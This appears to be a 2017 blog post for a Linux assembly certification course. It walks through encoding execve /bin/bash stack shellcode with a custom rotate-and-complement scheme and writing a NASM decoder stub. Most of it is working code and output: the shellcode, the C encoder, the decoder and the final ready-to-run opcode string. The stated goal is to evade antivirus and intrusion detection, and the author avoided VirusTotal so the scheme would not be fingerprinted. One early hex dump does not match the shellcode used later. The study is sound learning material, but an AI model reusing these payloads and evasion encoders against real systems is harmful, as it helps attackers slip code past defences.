---
layout: post
title:  "SLAE Assignment 4 - Encoding/Decoding Shellcode"
date:   2017-04-23
categories: certification
---
<br />
Student **SLAE - 891**  
Github: [https://github.com/phackt/slae](https://github.com/phackt/slae)  
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
  
## Assignment 4:  
  
Code is available on my [github repo](https://github.com/phackt/slae/tree/master/assignment4).  
  
**Our Goal:**  
> *Create a custom encoding scheme*
 - *POC with using the execve-stack as the shellcode*  
  
Hello everybody,  
  
Today we will create an encoded shellcode and its decoding routine.  Encoding a shellcode is useful to bypass Antivirus or Intrusion Detection Systems. Our resulting shellcode and its opcodes will have no meaning at all if the encoding scheme if robust enough (for example avoid classic XOR encoding).  
  
For each byte, our encoding scheme will consists in:  
 - Rolling four bits to the right (ROR instruction)  
 - Getting the complement of that byte (NOT)  
  
We will apply this encoding scheme on the following execve **/bin/bash** stack shellcode:  
```nasm
global _start			

section .text
_start:

	; PUSH the first null dword 
	xor eax, eax
	push eax

	; PUSH ////bin/bash (12) 

	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f

	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
```  
  
Testing the execve stack shellcode provides a /bin/bash prompt indeed:  
```bash
# gcc -o shellcode shellcode.c  && ./shellcode
Shellcode Length:  30
root@kali:/root/Documents/pentest/certs/slae/exam/assignment4# id
uid=0(root) gid=0(root) groups=0(root)
```  
  
Execve stack shellcode looks like:  
```bash
\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```
  
Let's now create our encoding routine ([shellcode_encode.c](https://github.com/phackt/slae/tree/master/assignment4/shellcode_encode.c)):  
```c
#include <stdio.h>
#include <string.h>

// execve stack shellcode
unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// print shellcode
void print_shellcode(){

	printf("Length %d\n",sizeof(shellcode));
	for (int i=0; i<strlen(shellcode); i++) {
		printf("\\x%02x", shellcode[i]);
	}
	printf("\n");

	for (int i=0; i<strlen(shellcode); i++) {
		printf("0x%02x,", shellcode[i]);
	}
}

void main()
{

	int	rotate = 4;	// rotate 4 bits to the right

	// print initial shellcode
	printf("Initial shellcode\n");
	print_shellcode();
	printf("\n");

	for (int i=0; i<strlen(shellcode); i++) {
		shellcode[i] = (shellcode[i] >> rotate) | (shellcode[i] << (8-rotate));	// ror method
		shellcode[i] = ~shellcode[i]; // one's complement 
	}

	// print encoded shellcode
	printf("\nEncoded shellcode\n");
	print_shellcode();
	printf("0xaa"); // marker for the end of encoded shellcode
	printf("\n");

}
```
  
The encoded execve stack shellcode is the following:  
```bash
0xec,0xf3,0xfa,0x79,0xd9,0xe9,0xc8,0x79,0x79,0xd9,0x69,0x19,0x0d,0x79,0x0d,0x0d,0x0d,0x0d,0x67,0xc1,0xfa,0x67,0xd1,0xca,0x67,0xe1,0xf4,0x4f,0x23,0xf7,0xaa
```
  
Let's create the decoding nasm shellcode [shellcode_decoder.nasm](https://github.com/phackt/slae/tree/master/assignment4/shellcode_decoder.nasm):  
```nasm
global _start			

section .text
_start:

	jmp short call_shellcode    ; jmp, call, pop technique

decoder:
	pop esi

decode: 
	xor eax, eax
	xor ebx, ebx
	mov al, byte [esi]          ; we move the byte to be decoded
	not al                      ; one's complement
	rol al, 4                   ; rolling on left to decode the rolling on right encoding
	mov byte [esi], al          ; saving the decoded byte

	lea esi, [esi + 1]          ; next byte   
	mov bl, [esi]  
	cmp bl, 0xaa                ; looking for the end of encoded shellcode
	je short EncodedShellcode   ; we jump to the decoded shellcode
	jmp short decode            ; keeping on decoding

call_shellcode:

	call decoder
	EncodedShellcode: db 0xec,0xf3,0xfa,0x79,0xd9,0xe9,0xc8,0x79,0x79,0xd9,0x69,0x19,0x0d,0x79,0x0d,0x0d,0x0d,0x0d,0x67,0xc1,0xfa,0x67,0xd1,0xca,0x67,0xe1,0xf4,0x4f,0x23,0xf7,0xaa
```  
  
Let's assembly, link and get the decoding shellcode:  
```bash
# ./compile.sh shellcode_decoder
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
# objdump -d ./shellcode_decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x1a\x5e\x31\xc0\x31\xdb\x8a\x06\xf6\xd0\xc0\xc0\x04\x88\x06\x8d\x76\x01\x8a\x1e\x80\xfb\xaa\x74\x07\xeb\xe7\xe8\xe1\xff\xff\xff\xec\xf3\xfa\x79\xd9\xe9\xc8\x79\x79\xd9\x69\x19\x0d\x79\x0d\x0d\x0d\x0d\x67\xc1\xfa\x67\xd1\xca\x67\xe1\xf4\x4f\x23\xf7\xaa"
```
  
Let's update the [shellcode.c](https://github.com/phackt/slae/tree/master/assignment4/shellcode.c) file and execute our decoding shellcode:  
![image1]({{ site.url }}/public/images/slae/assignment4/image1.png)  
  
Remember that running our shellcode thanks to shellcode.c is useful because our shellcode will be located into the writable .data segment.  
If we directly execute the shellcode_decoder executable, it will result in a segmentation fault because it will try to rewrite the EncodedShellcode variable located in the non writable .text segment (also useful to use the jmp/call/pop technique in order to avoid null bytes and to dynamically get the address of our encoded shellcode).  
  
We did not test it on [VirusTotal](https://www.virustotal.com/) in order to avoid the fingerprinting of the encoding scheme.  
Hope you enjoyed this post, don't hesitate to comment and share.  
  
[Phackt](https://twitter.com/phackt_ul)